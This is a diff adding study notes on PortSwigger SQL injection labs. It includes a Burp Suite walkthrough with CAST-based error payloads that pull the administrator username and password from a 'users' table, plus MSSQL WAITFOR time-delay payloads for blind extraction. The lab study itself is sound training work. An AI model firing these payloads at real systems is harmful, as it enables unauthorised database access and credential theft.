@@ -1633,13 +1633,120 @@ This type of query may also be useful if a character limit prevents you from tri
 
 ##### Lab: Visible error-based SQL injection
 
+This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
 
+<details>
+<summary>Lab details, screenshots & walkthrough 0.11</summary>
+
+![Access Lab 0.11](images/lab-0.11-visible-error-based/01-access-lab-0.11.png)
+
+![Open HTTP History and Send to Repeater 0.11](images/lab-0.11-visible-error-based/02-send-to-repeater-0.11.png)
+
+![Input Single Quote 0.11](images/lab-0.11-visible-error-based/03-single-quote-0.11.png)
+
+![Input SQL Comments 0.11](images/lab-0.11-visible-error-based/04-sql-comments-0.11.png)
+
+![Input CAST SELECT as Integer and Get False Response 0.11](images/lab-0.11-visible-error-based/05-cast-integer-false-0.11.png)
+
+![Input Comparison with 1 and Get True Response 0.11](images/lab-0.11-visible-error-based/06-cast-integer-true-0.11.png)
+
+![Clear Cookie and Retry Database Query 0.11](images/lab-0.11-visible-error-based/10-clear-cookie-retry-0.11.png)
+
+![Clear Cookie and Extract Administrator Username 0.11](images/lab-0.11-visible-error-based/07-extract-username-0.11.png)
+
+![Add LIMIT 1 to Retrieve Administrator Username 0.11](images/lab-0.11-visible-error-based/08-limit-one-username-0.11.png)
+
+![Extract Administrator Password Through CAST Error 0.11](images/lab-0.11-visible-error-based/09-extract-password-0.11.png)
+
+![Login Using Administrator Credentials 0.11](images/lab-0.11-visible-error-based/11-administrator-login-0.11.png)
+
+![Successfully Login and Verify Lab Solved 0.11](images/lab-0.11-visible-error-based/12-lab-solved-0.11.png)
+
+
+##### Tutorial
+
+1. Open Burp Suite and navigate to **Proxy → HTTP history**.
+2. Find a request containing the `TrackingId` cookie. Right-click the request and select **Send to Repeater**.
+3. In Repeater, append a single quote (`'`) to the `TrackingId` value to test whether the parameter is vulnerable to SQL injection.
+```sql
+'
+```
+4. Append `'--` to close the existing string and comment out the remaining SQL statement.
+```sql
+'--
+```
+5. Test error-based SQL injection using `CAST()`.
+```sql
+' AND CAST((SELECT 1) AS int)--
+```
+6. Modify the condition to compare the result with `1`, because the `AND` operator requires a boolean expression.
+```sql
+' AND 1=CAST((SELECT 1) AS int)--
+```
+7. Retrieve the username from the `users` table using a subquery.
+```sql
+' AND 1=CAST((SELECT username FROM users) AS int)--
+```
+8. Add `LIMIT 1` to ensure the subquery returns only one row.
+```sql
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+```
+9. Retrieve the password using the same `CAST()` technique.
+```sql
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
+10. Use the extracted username and password to authenticate as `administrator`.
+11. Verify that the PortSwigger lab displays **Solved**.
+
+##### Reference
+
+<details>
+<summary>29. SQL Injection - Lab #18 Visible error-based SQL injection | Short Version — Rana Khalil</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=sAZV4z9rOVE
+Purpose: In this video, we cover Lab #18 in the SQL injection module of the Web Security Academy. This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
+</details>
+
+</details>
 
 #### Exploiting blind SQL injection by triggering time delays
 
+If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.
+
+In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected conditions is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.
+
 #### Exploiting blind SQL injection by triggering time delays - Continued
+
+The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:
+
+```sql
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+- The fist of these inputs does not trigger a delay, because the condition `1=2` is false.
+- The second input triggers a delay of 10 seconds, because the condition `1=1` is true.
+
+Using this technique, we can retrieve data by testing one character at a time:
+
+```sql
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1,1) > 'm') = 1 WAITFOR DELAY '0:0{delay}'--
+```
+
+> Note: There are various ways to trigger time delays within SQL queries, and diffrent techniques apply on different types of database. For more details, see the [SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
+
 ##### Lab: Blind SQL injection with time delays and information retrieval
 
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+<details>
+<summary>Lab details, screenshots & walkthrough 0.12</summary>
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+The database contains a different table `users`, with columns called `username` and `password`. You need to exploit the blind SQL Injection vulnerability to find out the password of the `administrator` user.
+
+> Note: You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 #### Exploiting blind SQL injection using out-of-band (OAST) techniques
 
